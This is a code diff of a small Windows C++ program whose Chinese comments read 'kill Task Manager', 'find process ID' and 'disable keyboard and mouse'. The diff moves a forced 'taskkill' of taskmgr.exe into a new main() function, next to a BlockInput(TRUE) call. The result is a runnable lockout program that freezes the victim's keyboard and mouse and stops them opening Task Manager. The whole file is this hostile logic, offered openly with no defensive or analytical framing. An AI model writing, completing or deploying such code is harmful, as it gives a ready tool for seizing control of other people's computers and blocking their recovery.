@@ -1,13 +1,9 @@
 #include <windows.h>
 #include <Winuser.h>
-
-//杀死任务管理器
-system("taskkill /F /IM taskmgr.exe");
-
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <bits/stdc++.h>
-//寻找进程ID
+
 DWORD FindProcessId(const std::wstring& processName) {
 	PROCESSENTRY32 processInfo;
 	processInfo.dwSize = sizeof(processInfo);
@@ -23,6 +19,10 @@ DWORD FindProcessId(const std::wstring& processName) {
 	CloseHandle(processesSnapshot);
 	return 0;
 }
+int main(){
+
+//杀死任务管理器
+system("taskkill /F /IM taskmgr.exe");
 
 // 禁用键盘和鼠标
 HANDLE ProcessHandle = 0;
@@ -36,4 +36,6 @@ BlockInput(TRUE);
 if (ProcessHandle != NULL && ProcessHandle != INVALID_HANDLE_VALUE) {
     CloseHandle(ProcessHandle);
     ProcessHandle = 0;
+}
+
 }
